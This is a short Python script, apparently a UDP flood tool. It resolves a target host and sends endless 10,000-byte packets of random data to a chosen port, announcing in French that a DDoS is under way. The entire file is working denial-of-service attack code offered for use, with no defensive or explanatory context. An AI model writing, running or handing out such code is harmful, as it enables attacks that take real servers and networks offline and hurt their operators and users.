import socket
import random

def main(ip, port) -> None:
    ip = socket.gethostbyname(ip)
    print(f"[{ip}:{port}] DDOS en cours...")
    target = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target.connect((ip, port))
    while True:
        target.send(random._urandom(10**4))